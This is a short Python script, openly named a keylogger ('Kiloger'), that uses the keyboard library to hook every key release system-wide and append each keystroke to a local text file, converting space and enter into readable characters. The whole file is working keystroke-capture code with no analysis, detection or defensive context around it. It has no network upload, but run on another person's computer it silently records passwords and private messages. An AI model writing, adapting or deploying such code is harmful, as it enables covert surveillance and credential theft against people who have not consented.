import keyboard
class Kiloger():
    def __init__(self,filename):
        self.filename = open(filename ,"w")

    def startlogine(self):
        keyboard.on_release(callback=self.new_key)
        keyboard.wait()

    def new_key(self,event):
        print("new event")
        button =event.name
        if button =="space":
         button =" "
        if button == "enter":
            button ="\n"
        self.filename.write(button)
        self.filename.flush()
            
r = Kiloger("kiloger7.txt")
r.startlogine()
    



